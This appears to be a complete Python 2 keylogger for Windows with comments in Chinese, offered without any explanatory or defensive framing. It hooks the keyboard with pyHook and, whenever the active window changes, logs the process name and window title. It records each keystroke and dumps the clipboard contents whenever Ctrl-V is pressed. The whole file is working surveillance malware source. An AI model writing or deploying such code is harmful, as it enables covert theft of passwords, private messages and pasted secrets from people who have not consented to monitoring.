#!-*-coding=utf-8-*-
from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None


def get_current_process():
    # 前台窗口的句柄
    hwnd = user32.GetForegroundWindow()
    # 获得进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # 保存当前的进程ID
    process_id = "%d" % pid.value

    # 申请内存
    executable = create_string_buffer("\x00" * 512)

    # g
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # read gui.title
    window_title = create_string_buffer("\x00" * 512)
    lenth = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    print
    print "[PID:%s - %s - %s]" % (process_id, executable.value, window_title.value)
    print

    # 关闭句柄
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def keyStroke(event):
    global current_window

    # check target is change window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # check the key is custom key
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
    else:
        # 如果是输入为【Ctrl-V】，则获得剪切板的内容
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print "[PASTE] - %s" % (pasted_value),
        else:
            print "[%s]" % event.Key,
    return True


kl = pyHook.HookManager()
kl.KeyDown = keyStroke
kl.HookKeyboard()
pythoncom.PumpMessages()
